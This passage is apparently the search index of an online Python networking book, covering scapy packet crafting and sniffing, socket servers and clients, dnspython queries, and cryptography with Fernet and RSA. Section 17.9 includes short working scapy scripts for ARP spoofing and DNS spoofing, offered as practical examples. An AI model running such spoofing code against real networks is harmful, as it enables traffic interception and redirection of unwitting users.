    "href": "15_network_architecture_protocols.html#creating-and-sending-packets",
    "title": "16  Network Architecture and Protocols with Python",
    "section": "17.5 Creating and Sending Packets",
    "text": "17.5 Creating and Sending Packets\n\n17.5.1 Creating Packets\nPackets can be created by instantiating layer objects and stacking them together.\n\n\n17.5.2 Example\npacket = Ether() / IP(dst=\"192.168.1.1\") / TCP(dport=80)\n\n\n17.5.3 Sending Packets\nTo send packets, use the send() function for layer 3 packets (IP) and sendp() for layer 2 packets (Ethernet).\n\n\n17.5.4 Example\nsend(packet)\n\n\n17.5.5 Sending Multiple Packets\nYou can send multiple packets in a loop or use the sendp() function with a list of packets.\n\n\n17.5.6 Example\npackets = [Ether() / IP(dst=\"192.168.1.1\") / TCP(dport=80) for _ in range(10)]\nsendp(packets)",
    "crumbs": [
      "<span class='chapter-number'>16</span>  <span class='chapter-title'>Network Architecture and Protocols with Python</span>"
    ]
  },
  {
    "objectID": "15_network_architecture_protocols.html#capturing-packets",
    "href": "15_network_architecture_protocols.html#capturing-packets",
    "title": "16  Network Architecture and Protocols with Python",
    "section": "17.6 Capturing Packets",
    "text": "17.6 Capturing Packets\n\n17.6.1 Sniffing Packets\nscapy provides the sniff() function to capture packets from the network.\n\n\n17.6.2 Example\ndef packet_callback(packet):\n    print(packet.summary())\n\nsniff(prn=packet_callback, count=10)\n\n\n17.6.3 Filtering Packets\nYou can filter packets using BPF (Berkeley Packet Filter) syntax.\n\n\n17.6.4 Example\nsniff(filter=\"tcp and port 80\", prn=packet_callback, count=10)",
    "crumbs": [
      "<span class='chapter-number'>16</span>  <span class='chapter-title'>Network Architecture and Protocols with Python</span>"
    ]
  },
  {
    "objectID": "15_network_architecture_protocols.html#analyzing-packets",
    "href": "15_network_architecture_protocols.html#analyzing-packets",
    "title": "16  Network Architecture and Protocols with Python",
    "section": "17.7 Analyzing Packets",
    "text": "17.7 Analyzing Packets\n\n17.7.1 Dissecting Packets\nOnce you have captured packets, you can dissect and analyze them using various scapy functions.\n\n\n17.7.2 Example\npacket = sniff(count=1)[0]\nprint(packet.show())\n\n\n17.7.3 Accessing Packet Fields\nYou can access specific fields within a packet by treating it like a dictionary.\n\n\n17.7.4 Example\npacket = sniff(count=1)[0]\nprint(packet[IP].src)\nprint(packet[IP].dst)\n\n\n17.7.5 Working with Layers\nYou can access different layers of a packet using indexing.\n\n\n17.7.6 Example\npacket = sniff(count=1)[0]\nprint(packet[Ether].src)\nprint(packet[IP].src)\nprint(packet[TCP].dport)",
    "crumbs": [
      "<span class='chapter-number'>16</span>  <span class='chapter-title'>Network Architecture and Protocols with Python</span>"
    ]
  },
  {
    "objectID": "15_network_architecture_protocols.html#advanced-usage",
    "href": "15_network_architecture_protocols.html#advanced-usage",
    "title": "16  Network Architecture and Protocols with Python",
    "section": "17.8 Advanced Usage",
    "text": "17.8 Advanced Usage\n\n17.8.1 Custom Packet Crafting\nYou can create custom packets by defining your own layers.\n\n\n17.8.2 Example\nclass Custom(Packet):\n    name = \"Custom\"\n    fields_desc = [ShortField(\"field1\", 1), IntField(\"field2\", 2)]\n\ncustom_packet = Custom(field1=10, field2=20)\nsend(custom_packet)\n\n\n17.8.3 Packet Manipulation\nYou can manipulate packets by modifying their fields.\n\n\n17.8.4 Example\npacket = IP(dst=\"192.168.1.1\") / TCP(dport=80)\npacket[IP].dst = \"192.168.1.2\"\nsend(packet)\n\n\n17.8.5 Protocol Dissection\nscapy can dissect various protocols, making it useful for analyzing network traffic.\n\n\n17.8.6 Example\npacket = sniff(count=1)[0]\nif packet.haslayer(DNS):\n    print(packet[DNS].summary())",
    "crumbs": [
      "<span class='chapter-number'>16</span>  <span class='chapter-title'>Network Architecture and Protocols with Python</span>"
    ]
  },
  {
    "objectID": "15_network_architecture_protocols.html#practical-examples",
    "href": "15_network_architecture_protocols.html#practical-examples",
    "title": "16  Network Architecture and Protocols with Python",
    "section": "17.9 Practical Examples",
    "text": "17.9 Practical Examples\n\n17.9.1 Example 1: Ping Sweep\nThis example demonstrates how to perform a ping sweep to discover live hosts on a network.\ndef ping_sweep(network):\n    ans, unans = sr(IP(dst=network)/ICMP(), timeout=2)\n    for snd, rcv in ans:\n        print(f\"{rcv.src} is alive\")\n\nping_sweep(\"192.168.1.0/24\")\n\n\n17.9.2 Example 2: ARP Spoofing\nThis example demonstrates how to perform ARP spoofing to intercept network traffic.\ndef arp_spoof(target_ip, spoof_ip):\n    packet = ARP(op=2, pdst=target_ip, hwdst=\"ff:ff:ff:ff:ff:ff\", psrc=spoof_ip)\n    send(packet, verbose=False)\n\narp_spoof(\"192.168.1.100\", \"192.168.1.1\")\n\n\n17.9.3 Example 3: DNS Spoofing\nThis example demonstrates how to perform DNS spoofing to redirect DNS requests.\ndef dns_spoof(pkt):\n    if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0:\n        spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \\\n                      UDP(dport=pkt[UDP].sport, sport=53) / \\\n                      DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=\"192.168.1.2\"))\n        send(spoofed_pkt, verbose=False)\n\nsniff(filter=\"udp port 53\", prn=dns_spoof)",
    "crumbs": [
      "<span class='chapter-number'>16</span>  <span class='chapter-title'>Network Architecture and Protocols with Python</span>"
    ]
  },
  {
    "objectID": "15_network_architecture_protocols.html#best-practices",
    "href": "15_network_architecture_protocols.html#best-practices",
    "title": "16  Network Architecture and Protocols with Python",
    "section": "17.10 Best Practices",
    "text": "17.10 Best Practices\n\nError Handling: Always include error handling to manage unexpected conditions gracefully.\nResource Management: Ensure resources, such as sockets and files, are properly managed and closed.\nSecurity: Be mindful of security implications, such as running sniffing or spoofing scripts, and only use them on networks you own or have permission to test.\nDocumentation: Document your code to make it easier to understand and maintain.\nPerformance: Optimize your code for performance, especially when dealing with high volumes of network traffic.",
    "crumbs": [
      "<span class='chapter-number'>16</span>  <span class='chapter-title'>Network Architecture and Protocols with Python</span>"
    ]
  },
  {
    "objectID": "15_network_architecture_protocols.html#conclusion-1",
    "href": "15_network_architecture_protocols.html#conclusion-1",
    "title": "16  Network Architecture and Protocols with Python",
    "section": "17.11 Conclusion",
    "text": "17.11 Conclusion\nThe scapy module is a powerful tool for network packet analysis, manipulation, and crafting. By understanding its basic and advanced features, you can implement robust network analysis and security solutions. Whether you are building a simple network scanner or a complex packet manipulation tool, scapy provides the necessary functionality to handle network communication effectively.\nThis tutorial has covered the fundamentals of scapy, from creating and sending packets to capturing and analyzing them. With practice and further exploration, you can leverage the full potential of scapy in your network-related projects.",
    "crumbs": [
      "<span class='chapter-number'>16</span>  <span class='chapter-title'>Network Architecture and Protocols with Python</span>"
    ]
  },
  {
    "objectID": "15_network_architecture_protocols.html#table-of-contents-1",
    "href": "15_network_architecture_protocols.html#table-of-contents-1",
    "title": "16  Network Architecture and Protocols with Python",
    "section": "18.1 Table of Contents",
    "text": "18.1 Table of Contents\n\nIntroduction to the socket Module\nSocket Basics\nImplementing a TCP Server\nImplementing a TCP Client\nImplementing a UDP Server\nImplementing a UDP Client\nError Handling and Best Practices\nConclusion",
    "crumbs": [
      "<span class='chapter-number'>16</span>  <span class='chapter-title'>Network Architecture and Protocols with Python</span>"
    ]
  },
  {
    "objectID": "15_network_architecture_protocols.html#introduction-to-the-socket-module",
    "href": "15_network_architecture_protocols.html#introduction-to-the-socket-module",
    "title": "16  Network Architecture and Protocols with Python",
    "section": "18.2 Introduction to the socket Module",
    "text": "18.2 Introduction to the socket Module\nThe socket module provides access to the BSD socket interface. It supports various communication protocols, with TCP (Transmission Control Protocol) and UDP (User Datagram Protocol) being the most commonly used.\n\n18.2.1 Importing the Module\nimport socket",
    "crumbs": [
      "<span class='chapter-number'>16</span>  <span class='chapter-title'>Network Architecture and Protocols with Python</span>"
    ]
  },
  {
    "objectID": "15_network_architecture_protocols.html#socket-basics",
    "href": "15_network_architecture_protocols.html#socket-basics",
    "title": "16  Network Architecture and Protocols with Python",
    "section": "18.3 Socket Basics",
    "text": "18.3 Socket Basics\n\n18.3.1 Creating a Socket\nA socket can be created using the socket.socket() function, which takes two parameters: - socket.AF_INET: Address family for IPv4. - socket.SOCK_STREAM: For TCP sockets (use socket.SOCK_DGRAM for UDP).\n\n\n18.3.2 Example\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n\n18.3.3 Binding a Socket\nTo bind a socket to an IP address and port, use the bind() method.\n\n\n18.3.4 Example\ns.bind(('localhost', 8080))\n\n\n18.3.5 Listening for Connections (TCP)\nTo listen for incoming connections on a TCP server, use the listen() method.\n\n\n18.3.6 Example\ns.listen(5)  # 5 is the maximum number of queued connections\n\n\n18.3.7 Accepting Connections (TCP)\nTo accept an incoming connection, use the accept() method, which returns a new socket object and the address of the client.\n\n\n18.3.8 Example\nclient_socket, client_address = s.accept()\n\n\n18.3.9 Sending and Receiving Data\n\nTCP: Use send() and recv().\nUDP: Use sendto() and recvfrom().",
    "crumbs": [
      "<span class='chapter-number'>16</span>  <span class='chapter-title'>Network Architecture and Protocols with Python</span>"
    ]
  },
  {
    "objectID": "15_network_architecture_protocols.html#implementing-a-tcp-server",
    "href": "15_network_architecture_protocols.html#implementing-a-tcp-server",
    "title": "16  Network Architecture and Protocols with Python",
    "section": "18.4 Implementing a TCP Server",
    "text": "18.4 Implementing a TCP Server\n\n18.4.1 Steps to Implement a TCP Server\n\nCreate a socket.\nBind the socket to an address and port.\nListen for incoming connections.\nAccept connections and handle communication.\nClose the connection.\n\n\n\n18.4.2 Example TCP Server\nimport socket\n\ndef tcp_server():\n    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    server_socket.bind(('localhost', 8080))\n    server_socket.listen(5)\n    print(\"TCP server listening on port 8080\")\n\n    while True:\n        client_socket, client_address = server_socket.accept()\n        print(f\"Connection from {client_address}\")\n\n        while True:\n            data = client_socket.recv(1024)\n            if not data:\n                break\n            print(f\"Received data: {data.decode()}\")\n            client_socket.sendall(data)\n\n        client_socket.close()\n\nif __name__ == \"__main__\":\n    tcp_server()",
    "crumbs": [
      "<span class='chapter-number'>16</span>  <span class='chapter-title'>Network Architecture and Protocols with Python</span>"
    ]
  },
  {
    "objectID": "15_network_architecture_protocols.html#implementing-a-tcp-client",
    "href": "15_network_architecture_protocols.html#implementing-a-tcp-client",
    "title": "16  Network Architecture and Protocols with Python",
    "section": "18.5 Implementing a TCP Client",
    "text": "18.5 Implementing a TCP Client\n\n18.5.1 Steps to Implement a TCP Client\n\nCreate a socket.\nConnect to the server.\nSend and receive data.\nClose the connection.\n\n\n\n18.5.2 Example TCP Client\nimport socket\n\ndef tcp_client():\n    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    client_socket.connect(('localhost', 8080))\n\n    message = \"Hello, Server!\"\n    client_socket.sendall(message.encode())\n\n    data = client_socket.recv(1024)\n    print(f\"Received from server: {data.decode()}\")\n\n    client_socket.close()\n\nif __name__ == \"__main__\":\n    tcp_client()",
    "crumbs": [
      "<span class='chapter-number'>16</span>  <span class='chapter-title'>Network Architecture and Protocols with Python</span>"
    ]
  },
  {
    "objectID": "15_network_architecture_protocols.html#implementing-a-udp-server",
    "href": "15_network_architecture_protocols.html#implementing-a-udp-server",
    "title": "16  Network Architecture and Protocols with Python",
    "section": "18.6 Implementing a UDP Server",
    "text": "18.6 Implementing a UDP Server\n\n18.6.1 Steps to Implement a UDP Server\n\nCreate a socket.\nBind the socket to an address and port.\nReceive data and respond.\nClose the socket.\n\n\n\n18.6.2 Example UDP Server\nimport socket\n\ndef udp_server():\n    server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    server_socket.bind(('localhost', 8080))\n    print(\"UDP server listening on port 8080\")\n\n    while True:\n        data, client_address = server_socket.recvfrom(1024)\n        print(f\"Received data from {client_address}: {data.decode()}\")\n        server_socket.sendto(data, client_address)\n\nif __name__ == \"__main__\":\n    udp_server()",
    "crumbs": [
      "<span class='chapter-number'>16</span>  <span class='chapter-title'>Network Architecture and Protocols with Python</span>"
    ]
  },
  {
    "objectID": "15_network_architecture_protocols.html#implementing-a-udp-client",
    "href": "15_network_architecture_protocols.html#implementing-a-udp-client",
    "title": "16  Network Architecture and Protocols with Python",
    "section": "18.7 Implementing a UDP Client",
    "text": "18.7 Implementing a UDP Client\n\n18.7.1 Steps to Implement a UDP Client\n\nCreate a socket.\nSend data to the server.\nReceive response from the server.\nClose the socket.\n\n\n\n18.7.2 Example UDP Client\nimport socket\n\ndef udp_client():\n    client_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n\n    message = \"Hello, Server!\"\n    client_socket.sendto(message.encode(), ('localhost', 8080))\n\n    data, server_address = client_socket.recvfrom(1024)\n    print(f\"Received from server: {data.decode()}\")\n\n    client_socket.close()\n\nif __name__ == \"__main__\":\n    udp_client()",
    "crumbs": [
      "<span class='chapter-number'>16</span>  <span class='chapter-title'>Network Architecture and Protocols with Python</span>"
    ]
  },
  {
    "objectID": "15_network_architecture_protocols.html#error-handling-and-best-practices",
    "href": "15_network_architecture_protocols.html#error-handling-and-best-practices",
    "title": "16  Network Architecture and Protocols with Python",
    "section": "18.8 Error Handling and Best Practices",
    "text": "18.8 Error Handling and Best Practices\n\n18.8.1 Error Handling\nProper error handling is crucial for robust network applications. Use try-except blocks to handle exceptions.\n\n\n18.8.2 Example\ntry:\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.bind(('localhost', 8080))\n    s.listen(5)\nexcept socket.error as e:\n    print(f\"Socket error: {e}\")\nfinally:\n    s.close()\n\n\n18.8.3 Best Practices\n\nResource Management: Ensure sockets are properly closed after use.\nSecurity: Validate and sanitize data to prevent security vulnerabilities.\nConcurrency: Use threading or asynchronous programming for handling multiple connections.\nTimeouts: Set socket timeouts to avoid blocking indefinitely.",
    "crumbs": [
      "<span class='chapter-number'>16</span>  <span class='chapter-title'>Network Architecture and Protocols with Python</span>"
    ]
  },
  {
    "objectID": "15_network_architecture_protocols.html#conclusion-2",
    "href": "15_network_architecture_protocols.html#conclusion-2",
    "title": "16  Network Architecture and Protocols with Python",
    "section": "18.9 Conclusion",
    "text": "18.9 Conclusion\nThis tutorial has covered the basics of using Python’s socket module to create TCP and UDP clients and servers. With this knowledge, you can implement various network communication tasks, from simple client-server applications to complex network protocols.\nBy understanding and leveraging the socket module, you can build robust and efficient networked applications in Python. Explore further into advanced topics like asynchronous sockets, SSL/TLS, and more to enhance your network programming skills.",
    "crumbs": [
      "<span class='chapter-number'>16</span>  <span class='chapter-title'>Network Architecture and Protocols with Python</span>"
    ]
  },
  {
    "objectID": "16_network_services_mgmt.html",
    "href": "16_network_services_mgmt.html",
    "title": "17  Network Services and Management with Python",
    "section": "",
    "text": "17.0.1 DNS (Domain Name System)\nDNS is a service that translates domain names into IP addresses, making it easier for users to access websites without remembering numeric IP addresses.",
    "crumbs": [
      "<span class='chapter-number'>17</span>  <span class='chapter-title'>Network Services and Management with Python</span>"
    ]
  },
  {
    "objectID": "16_network_services_mgmt.html#table-of-contents",
    "href": "16_network_services_mgmt.html#table-of-contents",
    "title": "17  Network Services and Management with Python",
    "section": "18.1 Table of Contents",
    "text": "18.1 Table of Contents\n\nIntroduction to dnspython\nInstalling dnspython\nBasic DNS Queries\nQuerying Different Types of DNS Records\nReverse DNS Lookups\nAdvanced DNS Queries\nError Handling\nConclusion",
    "crumbs": [
      "<span class='chapter-number'>17</span>  <span class='chapter-title'>Network Services and Management with Python</span>"
    ]
  },
  {
    "objectID": "16_network_services_mgmt.html#introduction-to-dnspython",
    "href": "16_network_services_mgmt.html#introduction-to-dnspython",
    "title": "17  Network Services and Management with Python",
    "section": "18.2 Introduction to dnspython",
    "text": "18.2 Introduction to dnspython\ndnspython is a DNS toolkit for Python. It supports almost all record types defined in the DNS standards and allows for both querying and updating DNS records. It is a versatile library suitable for various DNS-related tasks.",
    "crumbs": [
      "<span class='chapter-number'>17</span>  <span class='chapter-title'>Network Services and Management with Python</span>"
    ]
  },
  {
    "objectID": "16_network_services_mgmt.html#installing-dnspython-1",
    "href": "16_network_services_mgmt.html#installing-dnspython-1",
    "title": "17  Network Services and Management with Python",
    "section": "18.3 Installing dnspython",
    "text": "18.3 Installing dnspython\nTo install dnspython, you can use pip:\npip install dnspython",
    "crumbs": [
      "<span class='chapter-number'>17</span>  <span class='chapter-title'>Network Services and Management with Python</span>"
    ]
  },
  {
    "objectID": "16_network_services_mgmt.html#basic-dns-queries",
    "href": "16_network_services_mgmt.html#basic-dns-queries",
    "title": "17  Network Services and Management with Python",
    "section": "18.4 Basic DNS Queries",
    "text": "18.4 Basic DNS Queries\n\n18.4.1 Querying an A Record\nAn A record maps a domain name to its corresponding IPv4 address.\nimport dns.resolver\n\ndef query_a_record(domain):\n    result = dns.resolver.resolve(domain, 'A')\n    for ipval in result:\n        print(f'A Record: {ipval.to_text()}')\n\nif __name__ == \"__main__\":\n    query_a_record('example.com')\n\n\n18.4.2 Querying an AAAA Record\nAn AAAA record maps a domain name to its corresponding IPv6 address.\nimport dns.resolver\n\ndef query_aaaa_record(domain):\n    result = dns.resolver.resolve(domain, 'AAAA')\n    for ipval in result:\n        print(f'AAAA Record: {ipval.to_text()}')\n\nif __name__ == \"__main__\":\n    query_aaaa_record('example.com')",
    "crumbs": [
      "<span class='chapter-number'>17</span>  <span class='chapter-title'>Network Services and Management with Python</span>"
    ]
  },
  {
    "objectID": "16_network_services_mgmt.html#querying-different-types-of-dns-records",
    "href": "16_network_services_mgmt.html#querying-different-types-of-dns-records",
    "title": "17  Network Services and Management with Python",
    "section": "18.5 Querying Different Types of DNS Records",
    "text": "18.5 Querying Different Types of DNS Records\n\n18.5.1 Querying MX Records\nMX (Mail Exchange) records specify the mail servers responsible for receiving email on behalf of a domain.\nimport dns.resolver\n\ndef query_mx_record(domain):\n    result = dns.resolver.resolve(domain, 'MX')\n    for mxval in result:\n        print(f'MX Record: {mxval.exchange.to_text()} preference: {mxval.preference}')\n\nif __name__ == \"__main__\":\n    query_mx_record('example.com')\n\n\n18.5.2 Querying NS Records\nNS (Name Server) records specify the authoritative name servers for a domain.\nimport dns.resolver\n\ndef query_ns_record(domain):\n    result = dns.resolver.resolve(domain, 'NS')\n    for nsval in result:\n        print(f'NS Record: {nsval.to_text()}')\n\nif __name__ == \"__main__\":\n    query_ns_record('example.com')\n\n\n18.5.3 Querying TXT Records\nTXT (Text) records provide text information to sources outside your domain.\nimport dns.resolver\n\ndef query_txt_record(domain):\n    result = dns.resolver.resolve(domain, 'TXT')\n    for txtval in result:\n        print(f'TXT Record: {txtval.to_text()}')\n\nif __name__ == \"__main__\":\n    query_txt_record('example.com')\n\n\n18.5.4 Querying CNAME Records\nCNAME (Canonical Name) records map an alias name to a true or canonical domain name.\nimport dns.resolver\n\ndef query_cname_record(domain):\n    result = dns.resolver.resolve(domain, 'CNAME')\n    for cnameval in result:\n        print(f'CNAME Record: {cnameval.to_text()}')\n\nif __name__ == \"__main__\":\n    query_cname_record('www.example.com')\n\n\n18.5.5 Querying SOA Records\nSOA (Start of Authority) records provide information about the domain and the corresponding DNS zone.\nimport dns.resolver\n\ndef query_soa_record(domain):\n    result = dns.resolver.resolve(domain, 'SOA')\n    for soaval in result:\n        print(f'SOA Record: {soaval.mname.to_text()} {soaval.rname.to_text()}')\n\nif __name__ == \"__main__\":\n    query_soa_record('example.com')",
    "crumbs": [
      "<span class='chapter-number'>17</span>  <span class='chapter-title'>Network Services and Management with Python</span>"
    ]
  },
  {
    "objectID": "16_network_services_mgmt.html#reverse-dns-lookups",
    "href": "16_network_services_mgmt.html#reverse-dns-lookups",
    "title": "17  Network Services and Management with Python",
    "section": "18.6 Reverse DNS Lookups",
    "text": "18.6 Reverse DNS Lookups\nReverse DNS lookups find the domain name associated with an IP address.\nimport dns.resolver\nimport dns.reversename\n\ndef reverse_dns_lookup(ip):\n    addr = dns.reversename.from_address(ip)\n    result = dns.resolver.resolve(addr, 'PTR')\n    for ptrval in result:\n        print(f'Reverse DNS: {ptrval.to_text()}')\n\nif __name__ == \"__main__\":\n    reverse_dns_lookup('8.8.8.8')",
    "crumbs": [
      "<span class='chapter-number'>17</span>  <span class='chapter-title'>Network Services and Management with Python</span>"
    ]
  },
  {
    "objectID": "16_network_services_mgmt.html#advanced-dns-queries",
    "href": "16_network_services_mgmt.html#advanced-dns-queries",
    "title": "17  Network Services and Management with Python",
    "section": "18.7 Advanced DNS Queries",
    "text": "18.7 Advanced DNS Queries\n\n18.7.1 Specifying a DNS Server\nYou can specify which DNS server to use for your queries.\nimport dns.resolver\n\ndef query_with_custom_dns(domain, dns_server):\n    resolver = dns.resolver.Resolver()\n    resolver.nameservers = [dns_server]\n    result = resolver.resolve(domain, 'A')\n    for ipval in result:\n        print(f'A Record: {ipval.to_text()}')\n\nif __name__ == \"__main__\":\n    query_with_custom_dns('example.com', '8.8.8.8')\n\n\n18.7.2 Setting Timeout and Retries\nYou can control the timeout and number of retries for DNS queries.\nimport dns.resolver\n\ndef query_with_timeout(domain, timeout, retries):\n    resolver = dns.resolver.Resolver()\n    resolver.timeout = timeout\n    resolver.lifetime = timeout * retries\n    result = resolver.resolve(domain, 'A')\n    for ipval in result:\n        print(f'A Record: {ipval.to_text()}')\n\nif __name__ == \"__main__\":\n    query_with_timeout('example.com', 1, 3)",
    "crumbs": [
      "<span class='chapter-number'>17</span>  <span class='chapter-title'>Network Services and Management with Python</span>"
    ]
  },
  {
    "objectID": "16_network_services_mgmt.html#error-handling",
    "href": "16_network_services_mgmt.html#error-handling",
    "title": "17  Network Services and Management with Python",
    "section": "18.8 Error Handling",
    "text": "18.8 Error Handling\nProper error handling is essential for robust DNS querying.\nimport dns.resolver\nimport dns.exception\n\ndef safe_dns_query(domain, record_type):\n    try:\n        result = dns.resolver.resolve(domain, record_type)\n        for val in result:\n            print(f'{record_type} Record: {val.to_text()}')\n    except dns.resolver.NXDOMAIN:\n        print(f'The domain {domain} does not exist.')\n    except dns.resolver.Timeout:\n        print(f'Timeout occurred while querying {domain}.')\n    except dns.exception.DNSException as e:\n        print(f'An error occurred: {e}')\n\nif __name__ == \"__main__\":\n    safe_dns_query('example.com', 'A')",
    "crumbs": [
      "<span class='chapter-number'>17</span>  <span class='chapter-title'>Network Services and Management with Python</span>"
    ]
  },
  {
    "objectID": "16_network_services_mgmt.html#conclusion-1",
    "href": "16_network_services_mgmt.html#conclusion-1",
    "title": "17  Network Services and Management with Python",
    "section": "18.9 Conclusion",
    "text": "18.9 Conclusion\nThis tutorial has provided a comprehensive guide to using the dnspython module for DNS querying. With dnspython, you can perform a wide range of DNS operations, from basic queries to advanced configurations. By understanding and utilizing this module, you can build powerful network tools and services that leverage DNS data.",
    "crumbs": [
      "<span class='chapter-number'>17</span>  <span class='chapter-title'>Network Services and Management with Python</span>"
    ]
  },
  {
    "objectID": "17_adv_network_concepts.html",
    "href": "17_adv_network_concepts.html",
    "title": "18  Advanced Networking Concepts with Python",
    "section": "",
    "text": "18.0.1 WAN Technologies and Protocols\nWide Area Networks (WANs) connect devices across large geographical areas. Key WAN technologies and protocols include:",
    "crumbs": [
      "<span class='chapter-number'>18</span>  <span class='chapter-title'>Advanced Networking Concepts with Python</span>"
    ]
  },
  {
    "objectID": "17_adv_network_concepts.html#table-of-contents",
    "href": "17_adv_network_concepts.html#table-of-contents",
    "title": "18  Advanced Networking Concepts with Python",
    "section": "19.1 Table of Contents",
    "text": "19.1 Table of Contents\n\nIntroduction to the cryptography Library\nInstalling the cryptography Library\nSymmetric Encryption and Decryption\n\nEncrypting with Fernet\nDecrypting with Fernet\n\nAsymmetric Encryption and Decryption\n\nGenerating RSA Keys\nEncrypting with RSA\nDecrypting with RSA\n\nConclusion",
    "crumbs": [
      "<span class='chapter-number'>18</span>  <span class='chapter-title'>Advanced Networking Concepts with Python</span>"
    ]
  },
  {
    "objectID": "17_adv_network_concepts.html#introduction-to-the-cryptography-library",
    "href": "17_adv_network_concepts.html#introduction-to-the-cryptography-library",
    "title": "18  Advanced Networking Concepts with Python",
    "section": "19.2 Introduction to the cryptography Library",
    "text": "19.2 Introduction to the cryptography Library\nThe cryptography library is designed to provide both high-level recipes and low-level interfaces for various cryptographic algorithms. It supports both symmetric and asymmetric encryption, hashing, key derivation, and more.",
    "crumbs": [
      "<span class='chapter-number'>18</span>  <span class='chapter-title'>Advanced Networking Concepts with Python</span>"
    ]
  },
  {
    "objectID": "17_adv_network_concepts.html#installing-the-cryptography-library-1",
    "href": "17_adv_network_concepts.html#installing-the-cryptography-library-1",
    "title": "18  Advanced Networking Concepts with Python",
    "section": "19.3 Installing the cryptography Library",
    "text": "19.3 Installing the cryptography Library\nTo install the cryptography library, use pip:\npip install cryptography",
    "crumbs": [
      "<span class='chapter-number'>18</span>  <span class='chapter-title'>Advanced Networking Concepts with Python</span>"
    ]
  },
  {
    "objectID": "17_adv_network_concepts.html#symmetric-encryption-and-decryption",
    "href": "17_adv_network_concepts.html#symmetric-encryption-and-decryption",
    "title": "18  Advanced Networking Concepts with Python",
    "section": "19.4 Symmetric Encryption and Decryption",
    "text": "19.4 Symmetric Encryption and Decryption\nSymmetric encryption uses the same key for both encryption and decryption. The cryptography library provides a high-level interface for symmetric encryption through the Fernet module.\n\n19.4.1 Encrypting with Fernet\nFernet guarantees that a message encrypted using it cannot be manipulated or read without the key. It uses AES in CBC mode with a 128-bit key for encryption and HMAC using SHA256 for authentication.\nfrom cryptography.fernet import Fernet\n\n# Generate a key\nkey = Fernet.generate_key()\ncipher_suite = Fernet(key)\n\n# Encrypt a message\nmessage = b\"Secret message\"\ncipher_text = cipher_suite.encrypt(message)\n\nprint(f\"Key: {key}\")\nprint(f\"Cipher text: {cipher_text}\")\n\n\n19.4.2 Decrypting with Fernet\nTo decrypt a message, use the same key that was used for encryption.\n# Decrypt the message\nplain_text = cipher_suite.decrypt(cipher_text)\nprint(f\"Plain text: {plain_text}\")",
    "crumbs": [
      "<span class='chapter-number'>18</span>  <span class='chapter-title'>Advanced Networking Concepts with Python</span>"
    ]
  },
  {
    "objectID": "17_adv_network_concepts.html#asymmetric-encryption-and-decryption",
    "href": "17_adv_network_concepts.html#asymmetric-encryption-and-decryption",
    "title": "18  Advanced Networking Concepts with Python",
    "section": "19.5 Asymmetric Encryption and Decryption",
    "text": "19.5 Asymmetric Encryption and Decryption\nAsymmetric encryption uses a pair of keys: a public key for encryption and a private key for decryption. The cryptography library supports RSA for asymmetric encryption.\n\n19.5.1 Generating RSA Keys\nFirst, generate an RSA key pair.\nfrom cryptography.hazmat.primitives.asymmetric import rsa\nfrom cryptography.hazmat.primitives import serialization\n\n# Generate private key\nprivate_key = rsa.generate_private_key(\n    public_exponent=65537,\n    key_size=2048\n)\n\n# Generate public key\npublic_key = private_key.public_key()\n\n# Serialize private key\npem = private_key.private_bytes(\n    encoding=serialization.Encoding.PEM,\n    format=serialization.PrivateFormat.PKCS8,\n    encryption_algorithm=serialization.NoEncryption()\n)\n\nwith open('private_key.pem', 'wb') as pem_out:\n    pem_out.write(pem)\n\n# Serialize public key\npem = public_key.public_bytes(\n    encoding=serialization.Encoding.PEM,\n    format=serialization.PublicFormat.SubjectPublicKeyInfo\n)\n\nwith open('public_key.pem', 'wb') as pem_out:\n    pem_out.write(pem)\n\n\n19.5.2 Encrypting with RSA\nUse the public key to encrypt a message.\nfrom cryptography.hazmat.primitives.asymmetric import padding\nfrom cryptography.hazmat.primitives import hashes\n\n# Load public key\nwith open('public_key.pem', 'rb') as pem_in:\n    public_key = serialization.load_pem_public_key(pem_in.read())\n\n# Encrypt message\nmessage = b\"Secret message\"\ncipher_text = public_key.encrypt(\n    message,\n    padding.OAEP(\n        mgf=padding.MGF1(algorithm=hashes.SHA256()),\n        algorithm=hashes.SHA256(),\n        label=None\n    )\n)\n\nprint(f\"Cipher text: {cipher_text}\")\n\n\n19.5.3 Decrypting with RSA\nUse the private key to decrypt the message.\n# Load private key\nwith open('private_key.pem', 'rb') as pem_in:\n    private_key = serialization.load_pem_private_key(pem_in.read(), password=None)\n\n# Decrypt message\nplain_text = private_key.decrypt(\n    cipher_text,\n    padding.OAEP(\n        mgf=padding.MGF1(algorithm=hashes.SHA256()),\n        algorithm=hashes.SHA256(),\n        label=None\n    )\n)\n\nprint(f\"Plain text: {plain_text}\")",
    "crumbs": [
      "<span class='chapter-number'>18</span>  <span class='chapter-title'>Advanced Networking Concepts with Python</span>"
    ]
  },
  {
    "objectID": "17_adv_network_concepts.html#conclusion-1",
    "href": "17_adv_network_concepts.html#conclusion-1",
    "title": "18  Advanced Networking Concepts with Python",
    "section": "19.6 Conclusion",
    "text": "19.6 Conclusion\nThis tutorial has provided a comprehensive guide to using the cryptography library for basic encryption and decryption in Python. With cryptography, you can implement both symmetric and asymmetric encryption in your applications, ensuring data privacy and security. Whether you need to encrypt sensitive data or secure communication channels, cryptography provides the tools you need to build secure applications.",
    "crumbs": [
      "<span class='chapter-number'>18</span>  <span class='chapter-title'>Advanced Networking Concepts with Python</span>"
    ]
  },
  {
    "objectID": "18_modern_network_practices.html",
    "href": "18_modern_network_practices.html",
    "title": "19  Modern Network Practices with Python",
    "section": "",
    "text": "19.0.1 DevOps Practices",
    "crumbs": [
      "<span class='chapter-number'>19</span>  <span class='chapter-title'>Modern Network Practices with Python</span>"
    ]
  },
  {
    "objectID": "18_modern_network_practices.html#table-of-contents",
    "href": "18_modern_network_practices.html#table-of-contents",
    "title": "19  Modern Network Practices with Python",
    "section": "20.1 Table of Contents",
